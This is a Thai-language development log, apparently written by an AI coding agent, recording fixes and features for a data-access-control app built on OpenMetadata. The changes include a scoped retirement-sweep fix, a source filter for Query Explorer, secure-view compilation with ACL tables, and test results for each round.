`AssetCrawlerTest` — 3 เทสต์ที่ assert พฤติกรรมเดิมถูกเขียนใหม่ให้ใช้ **domain** (facet ที่ตกทอดจริง) แทน tag และเพิ่มตัวใหม่

- `untaggedColumnsAreStillCovered` → **`untaggedColumnsStayUntagged`** (`.isEmpty()`)
- `columnOverridesInheritedTier` → **`columnKeepsOnlyItsOwnTag`**
- ใหม่ **`domainDescendsWhereTagsDoNot`** — level เดียว ใส่ทั้ง tag และ domain แล้ว assert ผลลัพธ์ต่างกัน 2 แบบใน crawl เดียว

ฝั่งหน้าจอเพิ่ม **`a column does not repeat what it inherited from its table`** — ให้ column `id` ถือแค่ domain ที่รับมาจาก table แล้ว assert ว่าแถวนั้นวาด `—` ไม่ใช่ชิป `Finance`

### AM.7 ผลรันจริงรอบนี้

```bash
export JAVA_HOME=".tools/jdk-21.0.12.1+1"

./mvnw -o -pl backend/dac-connector-openmetadata -am test
# → 91 tests, Failures: 0   (AssetCrawlerTest 6 · FacetInheritanceTest 9)

./mvnw -o test
# → BUILD SUCCESS ทุก module

./mvnw -o verify -Pintegration
# → 132 integration tests, Failures: 0
#   ตัวที่อ่าน asset_facet ผ่านหมด: AssetStoreIT 7 · CatalogQueryIT 18 ·
#   PolicyBindingMaterializerIT 10 · ImpactAnalysisIT 8 · PolicyOverviewIT 24 ·
#   GrantCompositionIT 17

cd frontend/app && npx tsc --noEmit    # → exit 0
cd frontend/app && npx jest            # → 21 suites / 129 tests ผ่านหมด
cd frontend/app && MSYS_NO_PATHCONV=1 VITE_BASE=/Arak/ npx vite build   # → ✓ built
```

restart backend แล้ว **Flyway migrate V13 + V14 สำเร็จ** (`now at version v14`) และ re-crawl ผ่าน `POST /api/v1/sync/openmetadata` — 33 tables / 352 columns / 1817 facet rows

### AM.8 ไฟล์ที่แตะรอบนี้

| ไฟล์ | ทำอะไร |
|---|---|
| `backend/dac-connector-openmetadata/.../facet/FacetInheritance.java` | เพิ่ม `INHERITABLE` + guard, ลบ dead mutual-exclusion, เขียน javadoc ใหม่ |
| `backend/dac-connector-openmetadata/.../facet/FacetInheritanceTest.java` | เขียนใหม่ทั้งไฟล์ — 2 `@Nested` / 9 เทสต์ |
| `backend/dac-connector-openmetadata/.../crawl/AssetCrawlerTest.java` | 3 เทสต์เปลี่ยนไปใช้ domain, +1 เทสต์ใหม่ |
| `frontend/app/src/pages/catalog/facets.tsx` | เพิ่ม `columnFacets()` |
| `frontend/app/src/pages/catalog/AssetDetailPage.tsx` | column row ใช้ `columnFacets()`, แก้ subtitle |
| `frontend/app/src/pages/catalog/AssetDetailPage.test.tsx` | แก้ 2 assertion + เพิ่มเทสต์ใหม่ |

### AM.9 ต่อจากนี้ (ค้างอยู่ ยังไม่ได้เริ่ม)

1. **หน้าแรกของ Requestor** — ไม่ต้องเห็น policy/governance widget ให้เป็นหน้า global search แบบหน้าแรก OpenMetadata แต่เข้า theme เรา และยัง customize ได้
2. **หน้า Your Profile — การ์ด Attributes** ยังไม่สวย ต้องจัดใหม่
3. **OpenMetadata connection ให้แก้ instance / credential ได้จากหน้าจอ** — ออกแบบไว้แล้ว (`V15__openmetadata_connection.sql`, `OmConnectionStore`, `OpenMetadataClient.reconfigure`, `WebhookResource` รับ `Supplier<String>`) แต่ยังไม่ได้เขียน
4. **Home dashboard ฝั่ง frontend** — backend + 26 เทสต์เสร็จแล้ว frontend มีแค่ `api/home.ts`
5. **ยังไม่ได้ commit** — local ยังนำ `origin/main` อยู่ 5 commit

---

## รอบก่อนหน้า — 🐛 **บั๊กจริงที่ลบข้อมูลทดสอบทิ้งทั้งชุด (`demo-pg` หาย + query ถูกปฏิเสธ)** · **Query Explorer เห็นเฉพาะ source ที่ต่อไว้จริง** · และ **Roadmap เพิ่ม M9 Access Request Management**

### AL.1 🐛 บั๊กที่ทำให้ `demo-pg` หายและทุก query ขึ้น "is not a governed asset"

ผู้ใช้รายงานสองเรื่องในนาทีเดียวกัน — query ขึ้น

```
Refused
public.assignments is not a governed asset on this source, so no policy could be applied to it
```

และ "`demo-pg` ที่เอาไว้ทดสอบหายไปไหนหมดเลยอะ"

**มันคือบั๊กตัวเดียวกัน** และเป็นบั๊กความถูกต้องจริง ไม่ใช่ config หาย

`AssetStore.finished(stats)` คือ retirement sweep ที่ปิด asset ที่ crawl รอบนี้ไม่ได้แตะ โค้ดเดิมคิดเรื่อง **crawl ที่ไม่สมบูรณ์** มาอย่างดี (ถ้า crawl เขียนอะไรไม่ได้เลย จะไม่กวาด) แต่**ไม่ได้คิดเรื่องขอบเขตเลย** — ทั้ง 6 statement ใช้เงื่อนไขเดียว:

```sql
WHERE is_current AND (last_seen_at IS NULL OR last_seen_at < :seen)
```

catalog ของเราเก็บ asset จาก **3 ที่**: `openmetadata` (crawl), `discovered` (`SourceCatalogImporter` ที่ introspect JDBC เอง), `local` (ทำมือ)
→ crawl OpenMetadata หนึ่งรอบจึง **ปิด asset ของอีกสองพวกทิ้งหมด** เพราะ OpenMetadata ไม่มีทางเอ่ยถึงมันอยู่แล้ว และที่หนักกว่าคือ **ลบแถว `asset_fqn_map` ทิ้งตรงๆ**

ผลที่ตามมาเป็นลูกโซ่:

| | |
|---|---|
| `asset_fqn_map` | เหลือ **0 แถว** |
| `demo-pg.salesdb.sales.customer` | `is_current = f`, `valid_to = 2026-09-23 13:19:44+00` (ระหว่าง session นี้เอง) |
| `provenance` | `discovered/f/4` · `openmetadata/t/36` |
| policy 14 ตัว | ผูกกับ asset ที่ไม่ current แล้ว → เงียบหมด |
| `QueryService` | resolve ไม่เจอ → คืน `null` |
| `QueryRewriter` | โยน `RefusedException` "is not a governed asset on this source" |

**ข้อความ error จึงอ่านเหมือนเป็นคำตัดสินของ policy แต่จริงๆ คือ cache row ที่ถูกลบไปแล้ว** — นี่คือส่วนที่อันตรายที่สุดของบั๊กตัวนี้

**FR-1.7 เขียนไว้ว่า sync ห้ามทับของ local** ข้อนี้ต้องใช้กับตัว asset เองด้วย ไม่ใช่แค่ tag บนมัน และ `deploy/seed/app/02-demo-facets.sql` ก็เขียนคอมเมนต์ไว้เองว่า *"the next OpenMetadata sync must leave them alone rather than 'correct' them out of existence"* ซึ่งคือสิ่งที่ sweep ละเมิดพอดี

**แก้:** ทั้ง 6 statement เติม scope `provenance = 'openmetadata'`

```sql
DELETE FROM asset_facet WHERE column_id IN (
    SELECT c.id FROM asset_column c
      JOIN asset a ON a.id = c.asset_id
     WHERE a.provenance = 'openmetadata'
       AND c.is_current
       AND (c.last_seen_at IS NULL OR c.last_seen_at < :seen))
```

```sql
UPDATE asset SET is_current = false, valid_to = :seen
WHERE provenance = 'openmetadata' AND is_current
  AND (last_seen_at IS NULL OR last_seen_at < :seen)
```

(รูปเดียวกันกับ `asset_owner`, `asset_fqn_map`, `asset_column`)

**พิสูจน์ว่าเทสต์จับได้จริง ไม่ใช่เขียนตามโค้ด** — `AssetStoreIT.sweepSparesOtherProvenances()` มือเขียน `data_source` + asset `provenance='discovered'` + column + `asset_fqn_map` แล้วรัน OM crawl เต็มๆ สองรอบ จากนั้น:

```bash
git stash push backend/.../AssetStore.java   # เอาเฉพาะตัวแก้ออก
# → Tests run: 1, Failures: 1 · expected: 1 but was: 0 · AssetStoreIT.java:369
git stash pop
# → Tests run: 7, Failures: 0
```

**กู้ข้อมูลคืนแล้ว** — build jar ใหม่ → restart → `POST /v1/sources/{id}/introspect` (1 table, 9 columns, `asset_fqn_map` กลับมาเป็น `MATCHED`) → รัน `02-demo-facets.sql` ซ้ำ (10 facets กลับมา)
พิสูจน์ปลายทาง: query `SELECT * FROM sales.customer` ในนาม `analyst_a` ตอนนี้ได้

```
Access to demo-pg.salesdb.sales.customer is denied.
finance-subscription did not apply: outside the policy's permitted time window
```

ซึ่งคือ **คำตัดสินของ policy จริง** (หน้าต่าง 08:00–18:00 Asia/Bangkok, ตอนนั้น 20:40) แปลว่า resolve + evaluate กลับมาทำงานครบวงแล้ว

---

### AL.2 Query Explorer — เห็นเฉพาะ source ที่ ARAK ต่อไว้จริง

ผู้ใช้สั่ง: *"ใน Query Explorer ถ้า Arak ไม่ได้ต่อ Source นั้นไว้ ก็ไม่ต้องขึ้นให้เห็นสิ"*

ของเดิมกรองด้วย **OM service FQN** (`asset.fqn.startsWith(serviceFqn + '.')`) ซึ่งพังสองชั้น:
1. กรองที่ **หน้าจอ** หลังจากดึงมาแล้ว 500 แถว → ถ้า catalog ใหญ่กว่านั้น จะได้ slice มั่วๆ ของ source เดียว
2. `demo-pg` ถูก discover ผ่าน JDBC ไม่มี `om_service_fqn` เลย → `serviceFqn` เป็นค่าว่าง → **ตัวกรองไม่ทำงานเลย** แล้วเสนอ table ของ `dtp-iprm` ครบ 36 ตัว ทั้งที่ ARAK ไม่มี connection ไปหามัน กดเมื่อไหร่ก็ได้ refusal เมื่อนั้น

**เกณฑ์ที่ถูกคือแถวเดียวกับที่ query proxy ใช้ resolve** คือ `asset_fqn_map` → สิ่งที่ list เสนอ กับสิ่งที่ query เอื้อมถึง จะเป็นเซตเดียวกัน**โดยโครงสร้าง** ไม่ใช่โดยข้อตกลง

```java
 AND (a.data_source_id = :sourceId
      OR EXISTS (SELECT 1 FROM asset_fqn_map m
                 WHERE m.data_source_id = :sourceId
                   AND m.verification_status <> 'ORPHANED'
                   AND (m.om_fqn = a.fqn
                        OR m.om_fqn LIKE a.fqn || '.%')))
```

สองแขนเพราะมีสอง importer: crawl เขียน `asset_fqn_map` (และตั้ง `data_source_id` ให้เมื่อ `om_service_fqn` ตรงกับ source ที่ register ไว้) ส่วน JDBC importer ตั้ง `data_source_id` บน asset ตรงๆ โดยไม่มี service FQN เลย
แขนที่สอง (`LIKE a.fqn || '.%'`) คือสิ่งที่ทำให้แถว service / database / schema ยังอยู่ในต้นไม้ — มันไม่มี mapping ของตัวเอง และต้นไม้ที่มีแต่ใบไม่มีกิ่งก็ไม่ใช่ต้นไม้

| ชั้น | ทำอะไร |
|---|---|
| `CatalogResource` | `@QueryParam("sourceId")` → parse เป็น UUID · **malformed = 400 ไม่ใช่เงียบ** (ต่างจาก facet ที่ ignore) เพราะค่านี้มาจาก picker ไม่ได้มาจากคนพิมพ์ และการ "ขยายรายการกลับไปเป็นทุก database" คือความล้มเหลวที่ตัวกรองนี้มีไว้กัน |
| `CatalogQuery.assets(...)` | รับ `UUID sourceId` เพิ่ม |
| `client.ts` | `AssetQuery.sourceId` + `params.set('sourceId', ...)` |
| `SchemaExplorer` | รับ `sourceId` แทน `serviceFqn` · ใส่ใน `queryKey` · `enabled: Boolean(sourceId)` · **ตัดการกรองฝั่ง client ทิ้ง** |
| `QueryPage:204` | ส่ง `sourceId={effectiveSource || null}` |

**empty state พูดความจริงแยกเป็น 3 แบบ** — ยังไม่เลือก source / เลือกแล้วแต่ค้นไม่เจอ / **เลือกแล้วแต่ ARAK ยังไม่เคยอ่าน catalog ของ source นี้ → บอกให้ไป introspect** (ของเดิมเขียนรวมว่า "Nothing in the catalog matches" ซึ่งโยนความผิดให้ผู้ใช้ทั้งที่เป็นงานที่ระบบยังไม่ได้ทำ)

**เทสต์ 3 ตัวใหม่ใน `CatalogQueryIT` (18/18 เขียว):**
- `narrowsToOneSource` — ครอบทั้งสองแขน: asset ที่ crawl map ไว้ กับ asset ที่ JDBC importer เป็นเจ้าของ และต้องไม่ปนกัน
- `narrowsToNothingWhenTheSourceHasNoMapping` — source ที่ยังไม่เคย introspect ต้องว่าง **ไม่ใช่โชว์ของ source อื่น**
- `hidesServicesWithNoRegisteredSource` — **เคสที่ผู้ใช้เจอจริง**: `dtp-iprm` ยังอยู่ในหน้า Catalog (ถูกแล้ว — policy author ควรเห็น) แต่ต้องหายจากตัวที่สัญญาว่าจะรัน query ให้

**พิสูจน์กับระบบจริง:** catalog มี **40** asset · กรองด้วย `sourceId` ของ `demo-pg` เหลือ **4** (`demo-pg` → `salesdb` → `sales` → `customer`) — `dtp-iprm` หายจาก explorer หมดแล้ว

> ⚠️ **หมายเหตุที่จงใจไม่ทำ:** ไม่ได้ซ่อน asset ที่ mapping เป็น `ORPHANED` ออกจาก list ทั้งที่ proxy จะ refuse มัน — `ORPHANED` แปลว่า "เจอ drift" ไม่ใช่ "ไม่ได้ต่ออยู่" การซ่อน table เงียบๆ ตอน drift แย่กว่าการโชว์แล้วให้ refusal อธิบายตัวเอง (แขน mapping ยังเช็ค `<> 'ORPHANED'` อยู่ เพราะ mapping ที่ orphan ไม่ใช่หลักฐานว่าเอื้อมถึง แต่แขน `data_source_id` เป็นหลักฐานตรงว่าสังกัด)

---

### AL.3 Roadmap — เพิ่ม **M9 Access Request Management** ให้เห็นชัด

ผู้ใช้ถามว่า *"ขาด Request Access Workflow หรือเปล่านะ / Access Request Management / ใส่ไปใน Roadmap ด้วยนะ"*

**ไม่ได้ขาดโดยอุบัติเหตุ** — แผนที่อนุมัติไว้ (FR-7) เลื่อนไป Phase 2 ตั้งแต่ต้น และ **Phase 1 วาง schema รอไว้แล้วจริง** เพื่อไม่ต้อง migrate ทีหลัง:

| ที่เตรียมไว้แล้ว | อยู่ตรงไหน |
|---|---|
| `grant.source` = `manual` \| `request` + `request_id` (nullable) | `V11__access_grant.sql` |
| `requiresApproval` · `approvers` · `validUntil` ใน policy model | Policy IR (JSON Schema) ตั้งแต่ M3 |
| auto-revoke เมื่อหมดอายุ + audit trail | ปิดไปแล้วรอบ AD.1 |
| `asset_owner` (user/team + `is_direct` + `inherited_from`) | ใช้ route หา approver ได้ทันที |

→ ใส่เป็น **M9** ในตาราง Current Progress แล้ว เพื่อให้มันอยู่ใน roadmap ไม่ใช่อยู่แต่ในไฟล์แผน

---

### AL.4 ไฟล์ที่แตะรอบนี้

| ไฟล์ | ทำอะไร |
|---|---|
| `backend/.../catalog/AssetStore.java` | **scope sweep เป็น `provenance = 'openmetadata'` ทั้ง 6 statement** + javadoc อธิบายว่าทำไม |
| `backend/.../catalog/CatalogQuery.java` | `assets(...)` รับ `UUID sourceId` + ตัวกรองสองแขน |
| `backend/.../resources/CatalogResource.java` | `@QueryParam("sourceId")` + 400 เมื่อ malformed |
| `backend/.../test/.../AssetStoreIT.java` | `sweepSparesOtherProvenances()` (7/7) |
| `backend/.../test/.../CatalogQueryIT.java` | 3 เทสต์ source filter + อัปเดต call site (18/18) |
| `frontend/app/src/api/client.ts` | `AssetQuery.sourceId` |
| `frontend/app/src/pages/query/SchemaExplorer.tsx` | กรองที่ server · empty state 3 แบบ |
| `frontend/app/src/pages/query/QueryPage.tsx` | ส่ง `sourceId` |

### AL.5 ผลรันจริงรอบนี้

| ชุด | ผล |
|---|---|
| `AssetStoreIT` | **7/7** (+1) · และพิสูจน์ว่าแดงเมื่อถอดตัวแก้ออก |
| `CatalogQueryIT` | **18/18** (+3) |
| `npx tsc --noEmit` | exit 0 |
| `npx jest` | **21 suites / 126 tests** เขียว |
| `VITE_BASE=/Arak/ npx vite build` | ✓ built in 8.08s |
| ยิง API จริง | catalog 40 asset → กรอง `demo-pg` เหลือ 4 |

### AL.6 ต่อจากนี้

คิวที่ผู้ใช้สั่งไว้และยังไม่ได้ทำ — จัดกลุ่มชิป Governance ตาม type · ปุ่ม Query ในหน้า asset · **หน้า Catalog แสดงเป็นกล่องความสูงเท่ากันแบบ OpenMetadata + paging (แต่เก็บ filter เดิมไว้)** · ดูด `description` เข้า search + เพิ่ม field `experts` / `reviewers` / `retentionPeriod` / `sourceUrl` / `tableType` · แล้วค่อยกลับไป M5 slice 2 (`V12__row_entitlement.sql`)

---

## รอบก่อนหน้า — **M5 slice 1: `ViewCompiler` เสร็จ** · **เคอร์เซอร์เป็นรูปมือทั้งแอป (กวาดทีเดียว 20 ปุ่ม)** · และ **Analyst A/B/C ล็อกอินได้จริงแล้ว**

### AK.1 `ViewCompiler` — โจทย์คือ "view ใบเดียว แต่ `PolicyDecision` เป็นของรายคน"

Secure view เป็น **object เดียวที่เสิร์ฟคนทั้งองค์กร** แต่ `PolicyDecision` ที่ engine คืนมาเป็นของ principal คนเดียว
ถ้าเอา decision ของ `analyst_a` ไป compile ตรงๆ จะได้ view ที่ hard-code สิทธิ์ของ `analyst_a` แล้วคนอื่นเห็นข้อมูลของ `analyst_a` หมด

**ทางออก: compile จาก *โครงสร้าง* ของ decision แล้วโยนค่าที่ขึ้นกับคน ไปเป็น lookup ตอน runtime**
ค่าที่ขึ้นกับคนทุกตัวย้ายไปอยู่ในตาราง ACL 3 ใบบน source:

| ตาราง | คีย์ | ตอบคำถามว่า |
|---|---|---|
| `acl.asset_subscription` | `(principal, asset)` | คนนี้เห็น table นี้ได้ไหม |
| `acl.row_entitlement` | `(principal, asset, entitlement_key, value)` | คนนี้เห็นแถวที่ค่าเท่ากับอะไรบ้าง |
| `acl.column_grant` | `(principal, asset, column_name, treatment)` | คนนี้เห็น column นี้ในรูปแบบไหน |

view ที่ออกมาจึงไม่มี literal ของใครอยู่เลย — ทุก gate เป็น `EXISTS (SELECT 1 FROM acl.… WHERE principal = CURRENT_USER …)`

**การตัดสินใจ 4 ข้อที่ต้องจำ:**

1. **`ALWAYS_FALSE` ไม่เขียน `1 = 0` ลง view** — view ใบนี้เสิร์ฟทุกคน ถ้าเขียน `1 = 0` ลงไปคือ table หายทั้งใบสำหรับทุกคน
   วิธีปฏิเสธคนคนเดียวคือ **ไม่ใส่แถวให้เขาใน `asset_subscription`** แล้ว gate ตัวแรกปิดเอง
2. **mask เรียงจากเข้มสุดลงมา และ `ELSE` คือตัวที่เข้มที่สุด** — ไม่มี grant = ได้ของที่เข้มที่สุด (fail-closed ตาม FR-5.1)
   **`PLAIN` เป็น treatment ที่ต้องถูก grant เหมือนกัน** ไม่ใช่ค่า default
3. **hidden column หายจาก view สำหรับทุกคน** — view ใบเดียวมี column list ชุดเดียว บังคับ per-principal ไม่ได้ → มี note เตือนตรงๆ (FR-4.5)
4. **operator ที่ lookup table แทนไม่ได้ (`GT/GTE/LT/LTE/CONTAINS/STARTS_WITH/MATCHES`) → ปิด view ทิ้ง** (`(1 = 0)`) พร้อม `Unenforceable{suggestedMode = PROXY}`
   **ห้ามเงียบๆ ตัด filter ทิ้งแล้วปล่อยผ่าน** — นั่นคือข้อมูลหลุด

`ViewCompiler.treatmentKey(MaskingSpec, String condition)` เป็น `public static` **โดยตั้งใจ** — slice 2 (`row_entitlement` maintainer) ต้องคำนวณคีย์เดียวกันเป๊ะ ห้ามเขียนใหม่ซ้ำ
คีย์เป็น `FUNCTION#<sha256 4 ไบต์แรก>` ของทุกพารามิเตอร์ของ mask → **ตัวคีย์เองไม่พก plaintext ของ mask ติดไปด้วย** (มีเทสต์ยืนยัน)

### AK.2 🔍 บั๊ก 2 ตัวที่เจอเพราะ **นั่งอ่าน DDL ที่มันสร้างออกมา** ไม่ใช่เพราะเทสต์แดง

เทสต์ 18 ตัวเขียวหมดแล้ว แต่พอเอา golden file มาอ่านทีละบรรทัดถึงเจอ:

1. **ฝั่ง SQL Server แพงเกินจำเป็น** — row gate เดิมใช้ `SqlDialect.toText(...)` ซึ่งบน SQL Server แปลว่า `CAST(... AS nvarchar(max))`
   เทียบ `nvarchar(max)` กับคอลัมน์ `nvarchar(256)` → **index seek บน PK ของ `row_entitlement` ใช้ไม่ได้** และ predicate ตัวนี้รัน **ทุกแถวของตารางจริง** → ชน NFR-2 เต็มๆ
   แก้เป็น `CAST(... AS <aclTextType()>)` คือ cast ไปเป็นชนิดของคอลัมน์ ACL เอง
   ```
   secure-view-postgres.sql:79    AND e."value"  = CAST("t"."branch_code"  AS text)
   secure-view-sqlserver.sql:82   AND e.[value]  = CAST([t].[branch_code]  AS nvarchar(256))
   ```
2. **`condition` ของ cell mask เป็น SQL ที่คนเขียนเอง** แล้วถูกใส่ลง view **ดิบๆ ตามที่เขียน** — และมันข้าม engine ได้ (เขียนบน PG แล้วไป compile ลง MSSQL)
   raw row filter มีคำเตือนอยู่แล้ว แต่อันนี้ไม่มี → เพิ่ม note ที่ระบุชื่อ dialect ให้คนที่กด approve DDL เห็น

> **บทเรียนที่ต้องจำ:** golden-file test พิสูจน์แค่ว่า "ผลลัพธ์ไม่เปลี่ยน" ไม่ได้พิสูจน์ว่า "ผลลัพธ์ถูก" — ตอน bless ไฟล์ครั้งแรกต้องอ่านจริงทั้งไฟล์

### AK.3 ⚠️ ข้อจำกัดที่ **จงใจไม่แก้** — `CONSTANT` บน column ที่เป็นตัวเลข

fixture มี `CONSTANT '***'` ทับ column `salary` ที่เป็น numeric → ได้
```sql
CASE WHEN … THEN "t"."salary" ELSE CASE WHEN (…) THEN '***' ELSE "t"."salary" END END AS "salary"
```
PostgreSQL จะปฏิเสธตอน `CREATE VIEW` ด้วย numeric coercion error

**ทำไมไม่แก้:** นี่เป็น **policy ที่คนเขียนผิด** ไม่ใช่บั๊กของ compiler และมันผิดเท่ากันทั้ง 3 โหมด (นิพจน์มาจาก `DecisionSql.masked` ที่ใช้ร่วมกัน)
ถ้า "แก้" ด้วยการ cast `salary` เป็น text จะทำให้ **ชนิดของคอลัมน์ใน view เปลี่ยนไปสำหรับผู้อ่านทุกคน** — แย่กว่าเดิม
→ ปล่อยให้ขั้นตอน apply DDL (slice 3) เป็นคนบอก แล้วให้คนเขียน policy แก้ที่ต้นทาง

### AK.4 เคอร์เซอร์ไม่เป็นรูปมือ — คราวนี้กวาดทั้งแอปทีเดียว

ผู้ใช้ทักเรื่องนี้เป็น**ครั้งที่ 3** (หน้า Governance กับหน้า People & attributes) → เลิกแก้ทีละจุด เขียนสคริปต์ไล่ `<button>` ทุกตัวใน `src/**/*.tsx` แล้วเช็กว่า className มี `tw:cursor-pointer` ไหม

เจอ **20 ปุ่ม** ที่ขาด แก้ครบทั้งหมด:

| ไฟล์ | จำนวน |
|---|---|
| `pages/governance/GovernancePage.tsx` | 3 (แท็บ · ปุ่ม action · chevron) |
| `pages/governance/PrincipalsPage.tsx` | 4 (ชิปตัวกรอง · ปุ่มสลับ kind · หัว accordion · show all) |
| `pages/catalog/CatalogPage.tsx` | 3 |
| `pages/catalog/GrantDialog.tsx` | 3 (หนึ่งในนั้นแก้ที่ helper `chip()` ไม่ใช่ที่ call site) |
| `pages/query/SchemaExplorer.tsx` | 3 |
| `pages/query/QueryPage.tsx` · `pages/docs/ExpressionDocsPage.tsx` · `pages/settings/pickers.tsx` | 4 |

`pickers.tsx` ปุ่ม **Change** disable ได้ → ใส่ `tw:disabled:cursor-default` คู่ไปด้วย ปุ่มที่กดไม่ได้ต้องไม่ยื่นรูปมือให้

**สคริปต์ตรวจเก็บไว้ที่** `scripts/check-cursor-pointer.mjs` — รันซ้ำได้ ถ้าเลข > 1 แปลว่ามีปุ่มใหม่ที่ลืม
(ที่เหลือ 1 ตัวคือ `<button>` ที่อยู่ใน**คอมเมนต์** ของ `layout/TopNav.tsx` — false positive)

### AK.5 Analyst A / B / C ล็อกอินได้จริงแล้ว

`analyst_a` กับ `analyst_b` **มีอยู่ใน DB มาตลอดพร้อม attribute ครบ แต่ไม่มี password** → ไม่เคยมีใครล็อกอินเป็นพวกเขาได้จริงเลย
`analyst_c` (เพอร์โซนา "เจ้าของ asset" ของ E2E ข้อ 10) ยังไม่มีเลย

| user | department | clearance | country | branch | บทบาทในเทสต์ |
|---|---|---|---|---|---|
| `analyst_a` | FINANCE | **L1** | **TH** | BKK-01 | โดน mask · เห็นเฉพาะ branch ตัวเอง |
| `analyst_b` | FINANCE | **L2** | **SG** | SIN-01 | clearance ผ่าน แต่โดน **deny ทั้ง table** เพราะ country ≠ dataResidency |
| `analyst_c` | FINANCE | **L1** | TH | CNX-01 | **ตั้ง clearance ต่ำโดยตั้งใจ** — ถ้าเข้าถึงได้ ต้องเป็นเพราะ `assetOwner: true` ไม่ใช่เพราะ clearance |

ทั้งสามได้ app role `REQUESTER` และเคลียร์ `must_change` ให้แล้ว (เพราะ**ยังไม่มีหน้าจอเปลี่ยน password** ถ้าไม่เคลียร์จะล็อกอินเข้าไปแล้วติดอยู่ตรงนั้น)

⚠️ **attribute ของ `analyst_c` ต้อง `INSERT` ด้วย SQL ตรงๆ** เพราะ M2 **ยังไม่มี write API สำหรับ attribute** — ข้อนี้ยังค้างอยู่เหมือนเดิม

> password เป็นของ **dev บน localhost เท่านั้น** อยู่ในแชทกับใน DB ที่รันอยู่ ไม่ได้ถูกเขียนลงไฟล์ไหนที่ commit ทั้งสิ้น

### AK.6 🪤 กับดักใหม่ 3 ตัวที่เสียเวลาไปรอบนี้

1. **heredoc ของ Bash ใหญ่พอจะใส่ไฟล์ Java ~600 บรรทัดไม่ได้** → `ENAMETOOLONG: name too long, uv_spawn` ต้องใช้ Write tool
2. **heredoc ของ Bash แปลง `\n` ในเนื้อหาให้เป็นขึ้นบรรทัดจริง** → พัง Java string literal เงียบๆ (`"... AS\n" + body` กลายเป็น literal ที่ไม่ปิด) **โดนไป 3 ครั้งรอบนี้** รวมถึงตอนแก้ `PostgresDialect` / `SqlServerDialect` / `ViewCompilerTest`
   เช่นเดียวกัน `\\` ในเนื้อหา heredoc ก็ยุบเหลือ `\` → `os.path.join(...).replace('\', '/')` พังทันที
   **→ อะไรที่มี backslash ให้เขียนไฟล์สคริปต์ด้วย Write tool แล้ว `python <path>` เท่านั้น**
3. **`-DfailIfNoSpecifiedTests=false` ไม่มีอยู่จริง** ชื่อที่ถูกคือ **`-Dsurefire.failIfNoSpecifiedTests=false`** (ต้องใช้เมื่อ `-Dtest=` คู่กับ `-am` เพราะ `dac-spec` ไม่มีเทสต์ที่ชื่อตรง)

### AK.7 ผลรันจริงรอบนี้

```
./mvnw -o test                      → BUILD SUCCESS   (ทุก module)
./mvnw -o -pl backend/dac-compiler-sql -am test
    DecisionSqlRowFilterTest  7      Failures: 0
    ViewCompilerTest         18      Failures: 0
    dac-compiler-sql         25      Failures: 0
npx tsc --noEmit                    → exit 0
VITE_BASE=/Arak/ npx vite build     → built in 9.03s
login analyst_a / analyst_b / analyst_c → 200 · roles=[REQUESTER] · mustChange=False
http://localhost:8090/Arak/         → 200
```

### AK.8 ไฟล์ที่แตะรอบนี้

| ไฟล์ | ทำอะไร |
|---|---|
| `backend/dac-compiler-sql/…/ViewCompiler.java` | **ใหม่** ~640 บรรทัด — หัวใจของ M5 slice 1 |
| `backend/dac-compiler-sql/…/ViewCompilerTest.java` | **ใหม่** — 18 tests |
| `backend/dac-compiler-sql/src/test/resources/golden/secure-view-{postgres,sqlserver}.sql` | **ใหม่** — golden file 2 dialect |
| `backend/dac-compiler-sql/…/{PostgresDialect,SqlServerDialect}.java` | ซ่อม string literal ที่ `\n` ถูกเขียนเป็นขึ้นบรรทัดจริง |
| `frontend/app/src/pages/**` 8 ไฟล์ | `tw:cursor-pointer` 20 ปุ่ม |
| `scripts/check-cursor-pointer.mjs` | **ใหม่** — ตัวตรวจว่ามีปุ่มไหนลืมใส่ |

### AK.9 ต่อจากนี้ (M5 slice 2) — **ทำแล้วรอบนี้ ดูข้อ AT**

~~`V12__row_entitlement.sql`~~ **(ข้อนี้ผิด — ตาราง `acl.*` อยู่ที่ source ไม่ใช่ app DB ดูข้อ AT.1)** + `RowEntitlementMaintainer` ที่แปลง `PolicyDecision` ของแต่ละ principal → แถวในตาราง ACL 3 ใบ
**ต้องเรียก `ViewCompiler.treatmentKey(...)` ห้ามคำนวณคีย์เอง** ไม่งั้น key ที่ maintainer เขียนกับที่ view มองหาจะไม่ตรงกัน แล้วทุกคนจะได้ `ELSE` (mask เข้มสุด) โดยไม่มีอะไรฟ้อง

---

## รอบก่อนหน้า — **ค้นหา policy ได้** · **หน้า Your profile** · และเริ่ม **M5 Secure View**

### AJ.1 หน้า Policies ค้นหาได้แล้ว — และค้นที่ server ไม่ใช่ที่หน้าจอ

ผู้ใช้สั่ง *"หน้า Policies อยากให้มี Search ด้วย"*

**จุดที่เกือบพลาด:** `GET /v1/policies` ส่งมาทีละหน้า (`limit` default 50, เพดาน 200) ถ้า filter เอาเฉพาะแถวที่อยู่บนจอ คนที่ค้นหาว่า "มี policy คุม PII อยู่แล้วหรือยัง" จะได้คำตอบว่า **"ไม่มี"** ทั้งที่มี — เป็นคำตอบที่ผิดแบบอันตรายที่สุดในหน้านี้ จึงทำเป็น server-side

- `PolicyStore.list(...)` รับ `search` เพิ่ม → `name ILIKE ... OR display_name ILIKE ... OR description ILIKE ... OR scope_fqn ILIKE ...`
  ค้น 4 คอลัมน์เพราะคนจำคนละอย่าง: ชื่อที่ตั้งไว้ / ชื่อที่แปะทีหลัง / เหตุผลที่เขียนไว้ / **ชื่อตารางที่มันคุม** (อันหลังคือที่คนใช้จริงมากที่สุด)
- `escapeLike()` — FQN เต็มไปด้วยจุด (LIKE ไม่สนใจ) แต่ชื่อ policy มี `_` ซึ่ง LIKE อ่านเป็น "อักษรอะไรก็ได้ 1 ตัว" ถ้าไม่ escape คนค้น `pii_mask` จะเจอ `piixmask` ด้วย
- `GET /v1/policies?q=` · `fetchPolicies({ q })` · ช่อง Search + ปุ่ม Clear บนหน้า `/policies` เก็บคำค้นไว้ใน URL (`?q=`) เหมือนหน้า People จะได้ copy link ส่งต่อได้
- empty state เปลี่ยนเป็น `No policy matches "<คำค้น>"` ไม่ใช่ข้อความกลางๆ

**พิสูจน์กับ API จริง:** `q=finance` → 3 · `q=owner` → 1 · `q=salesdb.sales` → 12 · **`q=example_owner` → 0** (ข้อสุดท้ายคือหลักฐานว่า `_` ถูก escape จริง ไม่งั้นต้องเจอ `example-owner`)
**พิสูจน์ในเบราว์เซอร์:** 14 แถว → ค้น `owner` → 1 แถว → ค้นคำมั่ว → empty state ที่มีคำค้นอยู่ในข้อความ → Clear → 14 แถว

### AJ.2 หน้า `/profile` — "ระบบรู้อะไรเกี่ยวกับฉันบ้าง"

